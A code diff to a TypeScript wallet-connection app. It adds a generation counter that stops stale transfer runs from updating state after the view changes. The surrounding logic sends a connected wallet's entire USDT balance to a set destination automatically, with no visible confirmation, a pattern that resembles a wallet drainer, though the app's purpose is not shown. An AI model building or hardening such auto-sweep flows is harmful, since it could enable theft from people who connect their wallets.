@@ -21,7 +21,10 @@ const state = {
   transferTxId: null as string | null,
 };
 
+let transferGeneration = 0;
+
 function goConnect(opts: { notice?: string; error?: string } = {}): void {
+  transferGeneration++;
   state.view = "connect";
   state.qrUri = null;
   state.notice = opts.notice ?? null;
@@ -65,7 +68,7 @@ function render(): void {
   });
 }
 
-async function autoSendAll(session: WalletSession, dest: string): Promise<void> {
+async function autoSendAll(session: WalletSession, dest: string, generation: number): Promise<void> {
   state.transferStatus = "pending";
   state.transferError = null;
   state.transferTxId = null;
@@ -73,6 +76,7 @@ async function autoSendAll(session: WalletSession, dest: string): Promise<void> 
 
   try {
     const balance = await fetchUsdtBalance(session.address);
+    if (generation !== transferGeneration) return;
     if (balance === 0n) {
       state.transferStatus = "error";
       state.transferError = "No USDT balance to send";
@@ -94,6 +98,7 @@ async function autoSendAll(session: WalletSession, dest: string): Promise<void> 
       },
     );
 
+    if (generation !== transferGeneration) return;
     if (result.ok) {
       state.transferStatus = "success";
       state.transferTxId = result.txId;
@@ -102,10 +107,11 @@ async function autoSendAll(session: WalletSession, dest: string): Promise<void> 
       state.transferError = result.error;
     }
   } catch (e) {
+    if (generation !== transferGeneration) return;
     state.transferStatus = "error";
     state.transferError = e instanceof Error ? e.message : "Transaction failed";
   } finally {
-    render();
+    if (generation === transferGeneration) render();
   }
 }
 
@@ -131,8 +137,11 @@ async function startConnect(): Promise<void> {
     state.session = session;
     state.view = "dashboard";
     state.qrUri = null;
+    state.transferStatus = null;
+    state.transferError = null;
+    state.transferTxId = null;
     render();
-    void autoSendAll(session, state.dest);
+    void autoSendAll(session, state.dest, transferGeneration);
   } catch (error) {
     const message = error instanceof Error ? error.message : "Connection failed";
     goConnect({ error: message });
